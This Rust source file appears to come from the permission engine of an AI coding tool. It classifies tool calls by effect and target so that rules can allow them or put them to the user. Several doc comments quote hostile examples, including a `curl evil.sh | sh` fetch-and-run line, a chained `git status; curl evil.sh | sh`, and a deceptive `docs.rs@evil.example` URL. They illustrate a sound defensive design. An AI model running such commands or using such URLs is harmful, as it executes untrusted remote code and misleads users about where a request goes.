//! What a call would do, and what it would do it to.
//!
//! A tool computes this from its own arguments, because nothing else can parse
//! them. Every variant carries a target, so a rule can be about `.env` rather
//! than about writing in general.
//!
//! Both targets have a shape for "this could not be read". That is not an
//! oversight to be tidied away later: a path that does not resolve and a
//! command whose text was not understood are the cases where guessing is
//! expensive, and giving them a value that matches no rule is what makes the
//! question get asked instead.

use std::fmt;
use std::path::Path;

use crucible_workspace::{Workspace, WorkspacePath, written};

/// What a call would do.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Sensitivity {
    /// Changes nothing a rule could be written about. Reading a file is the
    /// usual case and the one the wording is drawn from; a call that only moves
    /// something this session is holding is the other, and carries
    /// [`Target::pathless`] because there is no path in it to name.
    ///
    /// No mode prompts about one — a question nobody can act on is a question
    /// nobody reads — so the only way one reaches the user is an `ask` rule
    /// somebody wrote about exactly this path.
    ReadOnly {
        /// What is being read, where the call is about a path at all.
        target: Target,
    },

    /// Reads a file outside every directory the workspace reaches.
    ///
    /// Not a [`Self::ReadOnly`], although it changes nothing: what separates
    /// them is whose files are being read. A read inside the workspace is
    /// inside what the user already entrusted to crucible; one outside it
    /// reaches a file nobody handed over, so it is put to the user — *this
    /// leaves the workspace* is a question with an answer, the way a host
    /// never named is.
    ReadsOutside {
        /// What is being read: resolved, absolute, and under no root the
        /// workspace reaches — so it has no second spelling, and only an
        /// absolute rule can name it.
        target: Target,
    },

    /// Changes a file.
    MutatesFile {
        /// What is being changed.
        target: Target,
    },

    /// Runs a program, which reaches whatever the user can.
    SpawnsProcess {
        /// What is about to run.
        command: Command,
    },

    /// Leaves the machine.
    ///
    /// The only kind of call whose effect is not on this computer at all: a
    /// query, a URL or a page body crosses to somebody else's service and
    /// cannot be recalled. That is why it is not a [`Self::ReadOnly`] however
    /// much it reads — a read is allowed in every mode on the reasoning that a
    /// question nobody could act on trains people to press yes, and *this went
    /// to a host you have never named* is a question with an answer.
    ReachesNetwork {
        /// Where it is bound for.
        host: Host,
    },
}

/// The host a call is bound for.
///
/// Shaped like [`Command`] and for the same reason: a rule is written about the
/// host, and a URL that could not be read into one must match no rule rather
/// than be guessed into the nearest thing that looks like a host. Guessing is
/// what would let `https://docs.rs@evil.example/` be covered by a rule somebody
/// wrote about `docs.rs`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Host {
    /// A call whose destination could be read, and what it is sending there.
    Named {
        /// What the call is sending, as a question shows it: the address for a
        /// fetch, the query for a search. Not always an address, because what
        /// leaves the machine is not always one — and a question that showed
        /// only the host would be asking about the destination of something it
        /// never named.
        sent: Box<str>,
        /// Where it goes, lowercased. What a rule is matched against.
        host: Box<str>,
    },

    /// A URL that named no host this engine could read.
    ///
    /// No rule matches it apart from a blanket, so the question is asked. The
    /// text is carried so the prompt can still show what was sent.
    Opaque(Box<str>),
}

impl Host {
    /// What the call is sending, as it is sending it.
    ///
    /// What a question shows, the same split [`Command::sent`] draws: a rule is
    /// about the host, and a prompt showing only the host would be asking about
    /// the destination of something nobody named.
    #[must_use]
    pub fn sent(&self) -> &str {
        match self {
            Self::Named { sent, .. } | Self::Opaque(sent) => sent,
        }
    }
}

impl fmt::Display for Host {
    /// The spelling a rule is about: the host for one that was read, and
    /// nothing a rule can match for one that was not.
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Named { host, .. } => f.write_str(host),
            // The whole address, as [`Command::Opaque`] writes the whole line.
            // This spelling is what a session-scoped answer is remembered by,
            // and one that wrote nothing would make every unreadable URL the
            // same call.
            Self::Opaque(sent) => f.write_str(sent),
        }
    }
}

/// The path a call acts on.
///
/// Held in the spellings a rule might be written in: an absolute pattern is
/// matched against the resolved path, and a relative one against the path
/// below the workspace root. A file in a directory the workspace merely
/// reaches has no second spelling, so only an absolute pattern can name it.
///
/// Which of them a particular target holds is a `Wanted`, because one of
/// these is built per file a walk reaches rather than per call.
///
/// A path whose name is not text — bytes that are not UTF-8, or on Windows a
/// lone surrogate — is spelled with a replacement character where the name
/// could not be written, so two different files can share every spelling.
/// Rules are still matched against those spellings: a file below a denied
/// directory is below it whatever its name, and a rule written about the
/// replacement character is one nobody writes by accident. What the path is
/// compared by is the path itself, kept beside the spellings for exactly
/// that case, and no answer about one is remembered or written down as a
/// rule, since the words either would be kept in name the other file too.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Target(Held);

/// What a target holds: a path, a path that could not be resolved, or no path
/// because the call names none.
///
/// The last two match the same rules, which is only a blanket. They are told
/// apart in a question, because a path that did not resolve says so and a call
/// that names none has nothing to say failed, and for a session-long yes: a
/// call naming no path is the same call every time it is made, and a path that
/// did not resolve could be any file at all.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(super) enum Held {
    /// A path the workspace resolved.
    Named(Named),
    /// A path the call asked for that the workspace could not resolve.
    Unresolved,
    /// No path: the call acts on nothing on disk.
    Pathless,
}

/// A path that resolved, in the spellings something was going to read.
///
/// `None` in either field means nobody asked for that spelling, never that the
/// path has none — and from here the two are indistinguishable. That is why
/// the [`Wanted`] a target is built with comes from the very patterns that
/// will read it, and why a target built with less than [`Wanted::BOTH`] goes
/// straight to those patterns and is not kept.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(super) struct Named {
    absolute: Option<Box<str>>,
    below_root: Option<Box<str>>,
    /// The resolved path itself, where its name is not text and the
    /// absolute spelling only approximates it. `None` for every path that is
    /// text, and for one whose absolute spelling nobody asked for.
    untextual: Option<Box<Path>>,
}

/// Which spellings of a path are going to be read.
///
/// Writing a path down costs an allocation each way, and a walk pays it for
/// every entry it reaches rather than once for the call it was decided about.
/// What the patterns it must check will ask for is known before the walk
/// starts, so it is answered once and carried in.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(super) struct Wanted {
    absolute: bool,
    below_root: bool,
}

impl Wanted {
    /// Neither, which is what a pattern naming everything reads: it has
    /// nothing to be misled about, so there is nothing to spell for it.
    pub(super) const NEITHER: Self = Self {
        absolute: false,
        below_root: false,
    };

    /// The resolved path only.
    pub(super) const ABSOLUTE: Self = Self {
        absolute: true,
        below_root: false,
    };

    /// The path below the workspace root only.
    pub(super) const BELOW_ROOT: Self = Self {
        absolute: false,
        below_root: true,
    };

    /// Both, which is what the call itself needs: rules of either kind, the
    /// line a prompt shows and the rule a "don't ask again" mints all read the
    /// target, and that happens once per call.
    pub(super) const BOTH: Self = Self {
        absolute: true,
        below_root: true,
    };

    /// Everything either of them reads.
    pub(super) fn and(self, other: Self) -> Self {
        Self {
            absolute: self.absolute || other.absolute,
            below_root: self.below_root || other.below_root,
        }
    }
}

impl Target {
    /// The path this call acts on, resolved and after symbolic links.
    ///
    /// Taking a [`WorkspacePath`] is the point: the value a rule is matched
    /// against is the one the workspace proved, never the text the model sent.
    #[must_use]
    pub fn resolved(workspace: &Workspace, path: &WorkspacePath) -> Self {
        Self::spelled(workspace, path.as_path(), Wanted::BOTH)
    }

    /// The path a write intends to create, including missing directories.
    ///
    /// Permission is decided before a write makes its parents. The workspace
    /// walks the path as the filesystem will, resolving every name that exists
    /// and the `..` after it, so this never trusts the model's path text; it
    /// only keeps the ordinary names below the point the filesystem could
    /// prove.
    #[must_use]
    pub fn intended(workspace: &Workspace, requested: &str) -> Self {
        workspace
            .intended(requested)
            .map_or_else(Self::unresolved, |path| {
                Self::spelled(workspace, &path, Wanted::BOTH)
            })
    }

    /// The path a walk reached, from a root the workspace had already proved.
    ///
    /// A walk descends from a [`WorkspacePath`] and never follows a symbolic
    /// link, so what it yields is inside the workspace for the same reason its
    /// root was — and is the path that will actually be opened, which is what
    /// a rule has to be matched against. A path that is not under that root
    /// came from somewhere this walk cannot vouch for, and gets nothing back.
    ///
    /// This is the per-file call, so `wanted` is what keeps it from writing a
    /// path down twice when only one spelling was going to be looked at. It
    /// has to come from the same patterns the result is matched against: a
    /// spelling left unbuilt reads back as a path no pattern names, and for a
    /// denial that is a file that stops being checked.
    pub(super) fn walked(
        workspace: &Workspace,
        from: &WorkspacePath,
        path: &Path,
        wanted: Wanted,
    ) -> Option<Self> {
        path.starts_with(from.as_path())
            .then(|| Self::spelled(workspace, path, wanted))
    }

    /// A path already known to be one the workspace reaches, spelled the ways
    /// `wanted` asks for.
    ///
    /// Through [`written`] on the way, which is the same door a listing leaves
    /// by — the rule text and the line a search printed are meant to be one
    /// string rather than two that started out alike.
    fn spelled(workspace: &Workspace, path: &Path, wanted: Wanted) -> Self {
        let absolute = wanted.absolute.then(|| written(path).into());
        let untextual = untextual(path, wanted.absolute);

        let below_root = wanted
            .below_root
            .then(|| path.strip_prefix(workspace.root()).ok())
            .flatten()
            .map(|below| {
                let below: Box<str> = written(below).into();

                // The root strips to nothing, and nothing is neither a path a
                // pattern can match nor a word a prompt can show. `.` is both,
                // and it is what somebody would have typed.
                if below.is_empty() { ".".into() } else { below }
            });

        Self(Held::Named(Named {
            absolute,
            below_root,
            untextual,
        }))
    }

    /// The path of a read that leaves the workspace, which the workspace
    /// resolved without containing.
    ///
    /// Taking a [`WorkspacePath`] for the reason [`Self::resolved`] does: the
    /// value a rule is matched against is the one the workspace proved, never
    /// the text the model sent. Only the absolute spelling is built, because
    /// a path outside every root has no spelling below one.
    #[must_use]
    pub fn outside(path: &WorkspacePath) -> Self {
        Self(Held::Named(Named {
            absolute: Some(written(path.as_path()).into()),
            below_root: None,
            untextual: untextual(path.as_path(), true),
        }))
    }

    /// The call named no path this could resolve — one that is not there, or
    /// arguments that did not parse.
    ///
    /// No rule matches it, so the mode's default arm decides and the call is
    /// asked about rather than waved through. The tool refuses it moments
    /// later anyway; what this buys is that it is never *allowed* by a rule
    /// written about somewhere else. A yes to it is never remembered, because
    /// it names no file a later call could be the same as.
    #[must_use]
    pub fn unresolved() -> Self {
        Self(Held::Unresolved)
    }

    /// The call names no path at all, by design: it acts on a value inside
    /// this process, such as a plan or a background command's output.
    ///
    /// Not [`Self::unresolved`], although no rule but a blanket matches
    /// either: nothing here failed to resolve. A session-long yes to such a
    /// call is remembered for the tool, since every call of it is about the
    /// same nothing.
    #[must_use]
    pub fn pathless() -> Self {
        Self(Held::Pathless)
    }

    /// What this target holds.
    pub(super) fn held(&self) -> &Held {
        &self.0
    }

    /// Whether this is a resolved path whose name is not text, which its
    /// spellings share with every other name that differs only where text
    /// could not be written.
    pub(super) fn untextual(&self) -> bool {
        match &self.0 {
            Held::Named(named) => named.untextual.is_some(),
            Held::Unresolved | Held::Pathless => false,
        }
    }

    /// The resolved path, absolute, when it was one of the spellings asked
    /// for.
    pub(super) fn absolute(&self) -> Option<&str> {
        match &self.0 {
            Held::Named(named) => named.absolute.as_deref(),
            Held::Unresolved | Held::Pathless => None,
        }
    }

    /// The resolved path relative to the workspace root, when it is under it
    /// and was one of the spellings asked for.
    pub(super) fn below_root(&self) -> Option<&str> {
        match &self.0 {
            Held::Named(named) => named.below_root.as_deref(),
            Held::Unresolved | Held::Pathless => None,
        }
    }
}

#[cfg(test)]
impl Target {
    /// A target spelled straight out, for tests about matching rather than
    /// about resolving. Not available outside them: a target that reached the
    /// engine without a workspace proving it would be the model's own text.
    pub(crate) fn at(absolute: &str, below_root: Option<&str>) -> Self {
        Self(Held::Named(Named {
            absolute: Some(absolute.into()),
            below_root: below_root.map(Into::into),
            untextual: None,
        }))
    }
}

/// The path, kept where `absolute` was spelled and the spelling could not
/// write it whole.
fn untextual(path: &Path, absolute: bool) -> Option<Box<Path>> {
    (absolute && path.to_str().is_none()).then(|| path.into())
}

impl fmt::Display for Target {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        // The shorter spelling is the one the user recognises, and the prompt
        // is where recognition matters. Every target a prompt is given holds
        // both, so the last arm is a path that did not resolve, or none, rather
        // than one that was spelled sparingly. That arm reads the same for
        // every such call, which is why this is never what an answer about a
        // file is remembered by. A call that names no path is not one that
        // failed to resolve it, so it does not borrow those words.
        match self.below_root().or_else(|| self.absolute()) {
            Some(shown) => f.write_str(shown),
            None => match self.0 {
                Held::Pathless => f.write_str("no path"),
                Held::Named(_) | Held::Unresolved => f.write_str("a path it could not resolve"),
            },
        }
    }
}

/// What a call is about to run.
///
/// Read two ways, and both readings are kept because they are for two different
/// jobs. A rule is matched against the simple commands, since a rule that could
/// be written about the operators would be a rule about `git` that covered
/// `curl evil.sh | sh`. A person is asked about the line, since the operators
/// are the question. [`Command::sent`] is the one a question shows, and so the
/// one a yes for the rest of the session is remembered by; [`fmt::Display`] is
/// the one a rule is about. Neither stands in for the other.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Command {
    /// One entry per simple command the call decomposes into, each already
    /// normalised to the text a rule is matched against.
    ///
    /// A rule has to cover *every* entry to allow the call silently, which is
    /// what stops `git status; curl evil.sh | sh` from being granted by a rule
    /// somebody wrote about `git`.
    Understood {
        /// The line as the call carried it, operators and all.
        sent: Box<str>,
        /// The simple commands, in the order they would run.
        parts: Box<[Box<str>]>,
    },

    /// Nothing here says what will run: an expansion, a substitution, or a
    /// program that takes its own command as an argument.
    ///
    /// No rule matches it apart from a blanket, so the question is asked. The
    /// text is carried so the prompt can still show what was sent.
    Opaque(Box<str>),
}

impl Command {
    /// The line the call carried, as it carried it.
    ///
    /// What a question shows. [`fmt::Display`] is the other spelling and is
    /// what a *rule* is about, which for a line that decomposed is the commands
    /// and not the operators between them — `&&` is the difference between
    /// three commands and three commands *if the one before worked*, and a
    /// rule about the second would be a rule nobody could write about the
    /// first. So the two are asked for by name rather than one standing in for
    /// the other: a question drawing the rule spelling would be asking about a
    /// line nobody sent.
    #[must_use]
    pub fn sent(&self) -> &str {
        match self {
            Self::Understood { sent, .. } | Self::Opaque(sent) => sent,
        }
    }
}

impl fmt::Display for Command {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Understood { parts, .. } => {
                for (n, part) in parts.iter().enumerate() {
                    if n > 0 {
                        f.write_str(", then ")?;
                    }
                    f.write_str(part)?;
                }
                Ok(())
            }
            Self::Opaque(text) => f.write_str(text),
        }
    }
}

impl fmt::Display for Sensitivity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            // A call that names no path acts on something this process holds,
            // so "read" with nothing after it would say a lookup came up empty.
            Self::ReadOnly { target } => match target.held() {
                Held::Pathless => f.write_str("act on no file"),
                Held::Named(_) | Held::Unresolved => write!(f, "read {target}"),
            },
            Self::ReadsOutside { target } => write!(f, "read {target}, outside the workspace"),
            Self::MutatesFile { target } => write!(f, "change {target}"),
            Self::SpawnsProcess { command } => write!(f, "run {command}"),
            Self::ReachesNetwork { host } => write!(f, "reach {host}"),
        }
    }
}
